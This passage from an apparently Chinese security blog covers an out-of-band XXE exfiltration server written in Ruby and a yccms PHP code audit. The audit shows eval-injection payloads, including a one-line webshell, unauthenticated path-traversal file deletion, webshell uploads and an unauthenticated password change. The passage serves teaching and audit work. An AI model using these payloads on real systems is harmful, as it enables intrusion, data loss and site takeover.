class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c">require <span class="hljs-string">&#x27;socket&#x27;</span><br><br>ftp_server = TCPServer.new <span class="hljs-number">2121</span><br>http_server = TCPServer.new <span class="hljs-number">8088</span><br><br><span class="hljs-built_in">log</span> = File.open( <span class="hljs-string">&quot;xxe-ftp.log&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br><br>payload = <span class="hljs-string">&#x27;&lt;!ENTITY % b SYSTEM &quot;file:///tmp/1.txt&quot;&gt;</span><br><span class="hljs-string">           &lt;!ENTITY % c &quot;&lt;!ENTITY &amp;#37; rrr SYSTEM \&#x27;</span>ftp:<span class="hljs-comment">//127.0.0.1:2121/%b;\&#x27;&gt;&quot;&gt;</span><br>           %c;&#x27;<br><br>Thread.start <span class="hljs-keyword">do</span><br>loop <span class="hljs-keyword">do</span><br>  Thread.start(http_server.accept) <span class="hljs-keyword">do</span> |http_client|<br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;HTTP. New client connected&quot;</span><br>loop &#123;<br>req = http_client.gets()<br><span class="hljs-keyword">break</span> <span class="hljs-keyword">if</span> req.nil?<br><span class="hljs-keyword">if</span> req.start_with? <span class="hljs-string">&quot;GET&quot;</span><br>http_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;HTTP/1.1 200 OK\r\nContent-length: #&#123;payload.length&#125;\r\n\r\n#&#123;payload&#125;&quot;</span>)<br>end<br><span class="hljs-built_in">puts</span> req<br>&#125;<br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;HTTP. Connection closed&quot;</span><br>  end<br>end<br><br>end<br><br>Thread.start <span class="hljs-keyword">do</span><br>loop <span class="hljs-keyword">do</span><br>  Thread.start(ftp_server.accept) <span class="hljs-keyword">do</span> |ftp_client|<br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;FTP. New client connected&quot;</span><br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;220 xxe-ftp-server&quot;</span>)<br>loop &#123;<br>req = ftp_client.gets()<br><span class="hljs-keyword">break</span> <span class="hljs-keyword">if</span> req.nil?<br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;&lt; &quot;</span>+req<br><span class="hljs-built_in">log</span>.write <span class="hljs-string">&quot;get req: #&#123;req.inspect&#125;\n&quot;</span><br><br><span class="hljs-keyword">if</span> req.include? <span class="hljs-string">&quot;LIST&quot;</span><br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;drwxrwxrwx 1 owner group          1 Feb 21 04:37 test&quot;</span>)<br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;150 Opening BINARY mode data connection for /bin/ls&quot;</span>)<br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;226 Transfer complete.&quot;</span>)<br>elsif req.include? <span class="hljs-string">&quot;USER&quot;</span><br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;331 password please - version check&quot;</span>)<br>elsif req.include? <span class="hljs-string">&quot;PORT&quot;</span><br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;! PORT received&quot;</span><br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;&gt; 200 PORT command ok&quot;</span><br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;200 PORT command ok&quot;</span>)<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;&gt; 230 more data please!&quot;</span><br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;230 more data please!&quot;</span>)<br>end<br>&#125;<br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;FTP. Connection closed&quot;</span><br>  end<br>end<br>end<br><br>loop <span class="hljs-keyword">do</span><br>sleep(<span class="hljs-number">10000</span>)<br>end<br></code></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>代码审计一般只需要通过打DNS得到访问记录判断此漏洞存在即可</li><li>实际利用此漏洞(无回显)需要通过dns外带数据得到敏感信息</li><li>http传输一般只会读取文件第一行，可以通过开启恶意ftp服务读取换行文件</li></ol>]]></content>
    
    
    <categories>
      
      <category>Java代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
      <tag>漏洞学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yccms代码审计(php)</title>
    <link href="/2025/07/08/yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(php)/"/>
    <url>/2025/07/08/yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(php)/</url>
    
    <content type="html"><![CDATA[<h1 id="yccms代码审计-php"><a href="#yccms代码审计-php" class="headerlink" title="yccms代码审计(php)"></a>yccms代码审计(php)</h1><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><ul><li>更改config.inc.php对应的数据库名，用户名及密码即可</li><li>运行yccms.sql文件，在数据库中导入sql数据</li><li>访问http:&#x2F;&#x2F;域名&#x2F;admin，用户名及密码都为admin，登录后台</li></ul><h3 id="配置xdebug"><a href="#配置xdebug" class="headerlink" title="配置xdebug"></a>配置xdebug</h3><h4 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h4><ul><li><p><a href="https://segmentfault.com/a/1190000018961750">2024年更新，PhpStorm配置Xdebug最完整最详解教程，100%成功！ - 个人文章 - SegmentFault 思否</a></p></li><li><p>小迪安全php代码审计课程 day108</p></li><li><p><a href="https://mp.weixin.qq.com/s/7K8edea8imalZ8_jJp3ODw">phpstorm+phpstudy 配置xdebug (qq.com)</a></p></li></ul><h4 id="详细步骤："><a href="#详细步骤：" class="headerlink" title="详细步骤："></a>详细步骤：</h4><ul><li><p>phpstorm左上角file(菜单)-&gt;setting(设置)-&gt;php-&gt;sever</p><p>新建一个服务器，名称任意，端口与网站搭建端口一致</p><p><img src="/img/yccms/yccms02.png" alt="图片"></p></li><li><p>phpstorm左上角file(菜单)-&gt;setting(设置)-&gt;php-&gt;Debug(调试)</p><p>设置端口号为9100，防止端口进程冲突</p><p><img src="/img/yccms/yccms03.png" alt="图片"></p><p>调试下的DBGp按照如图设置，端口与刚刚设置的调试端口相对应</p><p><img src="/img/yccms/yccms04.png" alt="图片"></p><p>打开phpstudy，查看网站使用的php版本</p><p>在软件管理选项中找到对应的php版本，点击设置</p><p>打开xdebug调试组件，端口监听与刚刚设置的调试端口设为一致</p><p><img src="/img/yccms/yccms05.png" alt="图片"></p></li><li><p>phpstorm左上角file(菜单)-&gt;setting(设置)-&gt;php</p><p>将版本设置为与刚刚在phpstudy中查看的此网站使用的php版本</p><p><img src="/img/yccms/yccms06.png" alt="图片"></p></li><li><p>右上角添加配置中选择php网页添加配置</p><p><img src="/img/yccms/yccms07.png" alt="图片"></p></li></ul><h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><h4 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h4><p><img src="/img/yccms/yccms01.png" alt="图片"></p><p>可以看出此源码是MVC结构，最核心的控制代码在controller与model文件夹内</p><p>翻看目录发现此源码使用了smarty模板，随后可以查看是否存在ssti模板注入</p><h4 id="路由关系"><a href="#路由关系" class="headerlink" title="路由关系"></a>路由关系</h4><ul><li><p>?a&#x3D;admin&amp;m&#x3D;update</p><p>key值为a传入类名，key值为m传入方法名</p></li></ul><h4 id="漏洞复现-有入口，才可利用"><a href="#漏洞复现-有入口，才可利用" class="headerlink" title="漏洞复现(有入口，才可利用)"></a>漏洞复现(有入口，才可利用)</h4><p>参考：<a href="https://www.cnblogs.com/KRookieSec/p/17142265.html">记一次完整的PHP代码审计——yccms v3.4审计 - KRookieSec - 博客园 (cnblogs.com)</a></p><p>​   <a href="https://xz.aliyun.com/news/9362">代码审计—YCCMS系统-先知社区 (aliyun.com)</a></p><p>使用seay进行自动化审计，找到可能存在漏洞的地方，逐个测试</p><p><img src="/img/yccms/yccms08.png" alt="图片"></p><h5 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h5><p>找到此方法是否有被实例化</p><p>发现run.inc.php实例化此方法，admin&#x2F;index.php包含了此文件</p><p>public&#x2F;class目录下的Factory.class.php文件，文件类名为Factory</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">static</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setModel</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$_a</span> = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">getA</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/model/&#x27;</span>.<span class="hljs-variable">$_a</span>.<span class="hljs-string">&#x27;Model.class.php&#x27;</span>)) <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;self::$_obj = new &#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Model();&#x27;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable">$_obj</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>eval函数内变量可控</p><p>需要传入一个类名，并且满足(或绕过)file_exists()函数的检查</p><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?a=Factory();phpinfo();//../<br></code></pre></td></tr></table></figure><p>分析：</p><ol><li>调用Factory()类中方法</li><li>用;隔开以执行下一条语句</li><li>&#x2F;..&#x2F;跳至上一级绕过file_exist()函数检测</li></ol><p>顺利注入</p><p><img src="/img/yccms/yccms10.png" alt="图片"></p><p>尝试写入一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?a=Factory();@eval($_POST[v]);//../<br></code></pre></td></tr></table></figure><p>看一些文章是可以顺利连接的，我这里没有成功</p><h5 id="无需登录文件删除"><a href="#无需登录文件删除" class="headerlink" title="无需登录文件删除"></a>无需登录文件删除</h5><p>controller&#x2F;PicAction.class.php文件中控制删除功能的方法没有对文件名及文件路径的检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123; <span class="hljs-comment">// 定义一个公共方法 delall，用于删除图片</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123; <span class="hljs-comment">// 如果表单提交了（send 参数存在）</span><br>        <span class="hljs-comment">// 如果 pid 参数为空（即用户没有选择任何图片）</span><br>        <span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>])) <br>            <span class="hljs-comment">// 弹出警告框提示“没有选择任何图片”，然后跳转回 pic 页面</span><br>            tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;没有选择任何图片!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br><br>        <span class="hljs-variable">$_fileDir</span> = ROOT_PATH.<span class="hljs-string">&#x27;/uploads/&#x27;</span>; <span class="hljs-comment">// 图片文件所在的目录</span><br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123; <span class="hljs-comment">// 遍历所有要删除的图片文件名</span><br>            <span class="hljs-variable">$_filePath</span> = <span class="hljs-variable">$_fileDir</span>.<span class="hljs-variable">$_value</span>; <span class="hljs-comment">// 构造完整的文件路径</span><br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_filePath</span>))&#123; <span class="hljs-comment">// 尝试删除该文件，如果失败</span><br>                <span class="hljs-comment">// 弹出警告框提示“图片删除失败”，建议设置权限为 777</span><br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;图片删除失败,请设权限为777!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 删除成功后，立即重定向回 pic 页面</span><br>                <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:?a=pic&#x27;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其他文件有文件路径检测，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_dirPath</span>=<span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)).<span class="hljs-string">&#x27;\\&#x27;</span>.<span class="hljs-variable">$_navname</span>.<span class="hljs-string">&#x27;\\&#x27;</span>);<br></code></pre></td></tr></table></figure><p>开始测试</p><p>寻找网站功能点：其他功能-&gt;图片管理</p><p>点击删除按钮后抓取数据包，得到数据包内容</p><p><img src="/img/yccms/yccms11.png" alt="图片"></p><p>send值是url编码过的，解码后为删除选中图片</p><p>pid后url编码解码后为[0]</p><p>退出admin账户的登陆后，将网站根目录下CMS系统安装声明文件重命名为CMS(一会测试时无需再对中文url编码)</p><p>更改数据包pid[0]参数的值为&#x2F;..&#x2F;CMS，发送数据包，发现成功删除文件</p><h5 id="无需登录文章删除"><a href="#无需登录文章删除" class="headerlink" title="无需登录文章删除"></a>无需登录文章删除</h5><p>controller&#x2F;ArticleAction.class.php</p><p>漏洞代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>])) tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;没有选择任何内容!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">7</span>);<br><span class="hljs-comment">//$this-&gt;_model-&gt;id=implode(&#x27;,&#x27;,$_POST[&#x27;showid&#x27;]);</span><br><span class="hljs-comment">//echo $this-&gt;_model-&gt;id;</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;id=<span class="hljs-variable">$_value</span>;<br><span class="hljs-variable">$_findOne</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">findOne</span>();<br><span class="hljs-variable">$html</span>=<span class="hljs-variable">$_findOne</span>[<span class="hljs-number">0</span>]-&gt;html;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$html</span>==<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-variable">$html</span>=<span class="hljs-string">&#x27;0.html&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//先删除静态文件</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$html</span>))&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$html</span>))&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;静态文件删除失败,请设权限为777!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">5</span>);<br>&#125;<br>&#125;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">delete_article</span>();<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:&#x27;</span>.tool::<span class="hljs-title function_ invoke__">getPrevPage</span>());<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过代码可以看到基本上是没有检测的，传入id即可删除对应的文章，但是由于变量是固定的，所以只能删除文章</p><p>不能删除其他文件</p><p>开始测试：</p><p>寻找功能点：内容管理-&gt;文章列表</p><p>点击删除抓取数据包</p><p><img src="/img/yccms/yccms13.png" alt="图片"></p><p>看到是直接get传参，更改id的值就可以的</p><p>退出登录后更改id发送数据包，再次登录查看，发现顺利删除文章</p><h5 id="无需登录文件上传01"><a href="#无需登录文件上传01" class="headerlink" title="无需登录文件上传01"></a>无需登录文件上传01</h5><p>public&#x2F;class&#x2F;FileUpload.class.php</p><p>查看源代码发现只对上传图片类型和文件大小做了判断，并且进行了重命名</p><p>在网站寻找功能点：系统设置-&gt;首页内容</p><p>在编辑器自带的文件上传功能点处可以上传文件</p><p>抓取数据包，更改文件名和文件内容，顺利上传</p><p><img src="/img/yccms/yccms14.png" alt="图片"></p><p>用蚁剑成功连接</p><p><img src="/img/yccms/yccms15.png" alt="图片"></p><p>经测试，退出登陆后直接发包也可以正常上传，可以正常连接</p><h5 id="无需登录文件上传02"><a href="#无需登录文件上传02" class="headerlink" title="无需登录文件上传02"></a>无需登录文件上传02</h5><p>直接寻找功能点：系统设置-&gt;上传logo</p><p>找到对应控制代码</p><p><img src="/img/yccms/yccms16.png" alt="图片"></p><p>上传后的文件会被重命名为logo，检验文件类型的函数极容易绕过</p><p>方法同01抓取数据包后更改文件内容与文件名</p><p>可以看到顺利上传</p><p><img src="/img/yccms/yccms17.png" alt="图片"></p><p>用蚁剑测试依旧是能够连接成功</p><p><img src="/img/yccms/yccms18.png" alt="图片"></p><p>退出登录后同样可以发送数据包并且用蚁剑顺利连接</p><h5 id="任意密码修改-未鉴权"><a href="#任意密码修改-未鉴权" class="headerlink" title="任意密码修改(未鉴权)"></a>任意密码修改(未鉴权)</h5><p>controller&#x2F;AdminAction.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//后台初始</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;admin/public/admin.tpl&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">alertLocation</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">&#x27;?a=login&#x27;</span>);<br>&#125;<br><br>&#125;<br><span class="hljs-comment">//修改密码</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;用户名不能为空&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;密码不能为空!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br><span class="hljs-keyword">if</span>(!(validate::<span class="hljs-title function_ invoke__">checkStrEquals</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;notpassword&#x27;</span>]))) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;两次密码不一致!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;username=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;password=<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$_edit</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">editAdmin</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_edit</span>)&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;密码修改成功!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;密码未修改!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;admin/public/update.tpl&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到登录到后台页面是有鉴权的，但是执行update方法时就没有鉴权了</p><p>在网站找到功能点：其他功能-&gt;修改密码</p><p>抓取数据包，在数据包中做数据的修改</p><p><img src="/img/yccms/yccms19.png" alt="图片"></p><p>网站退出登录后可以正常发送数据包</p><p>尝试新用户名和密码后发现可以正常登录</p><h5 id="rce-Action-class-php-误报"><a href="#rce-Action-class-php-误报" class="headerlink" title="rce(Action.class.php)误报"></a>rce(Action.class.php)误报</h5><p>路径：controller&#x2F;Action.class.php</p><p>调用eval函数，可能存在rce漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$_m</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>] : <span class="hljs-string">&#x27;index&#x27;</span>;<br><span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$_m</span>) ? <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$this-&gt;&#x27;</span>.<span class="hljs-variable">$_m</span>.<span class="hljs-string">&#x27;();&#x27;</span>) : <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">index</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>查找利用点时发现每一个controller中的文件都继承了此类</p><p>构造payload(<a href="http://localhost/yccms/admin/?a=admin&m=phpinfo)%E5%8F%91%E7%8E%B0%E5%B9%B6%E6%B2%A1%E6%9C%89%E5%9B%9E%E6%98%BE">http://localhost/yccms/admin/?a=admin&amp;m=phpinfo)发现并没有回显</a></p><p>使用动态调试后可以看到m的值初始时为phpinfo</p><p><img src="/img/yccms/yccms09.png" alt="图片"></p><p>经过run.inc.php方法中代码Factory::setAction()-&gt;run();</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 使用工厂模式调用控制器并执行对应方法</span><br><span class="hljs-title class_">Factory</span>::<span class="hljs-title function_ invoke__">setAction</span>()-&gt;<span class="hljs-title function_ invoke__">run</span>();<br></code></pre></td></tr></table></figure><p>m的值被替换为main</p><p>查看setAction方法，此方法中的可控变量是a</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">static</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setAction</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$_a</span>=<span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">getA</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_a</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;nav&#x27;</span>, <span class="hljs-string">&#x27;article&#x27;</span>,<span class="hljs-string">&#x27;backup&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;link&#x27;</span>,<span class="hljs-string">&#x27;pic&#x27;</span>,<span class="hljs-string">&#x27;search&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;xml&#x27;</span>,<span class="hljs-string">&#x27;online&#x27;</span>))) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) 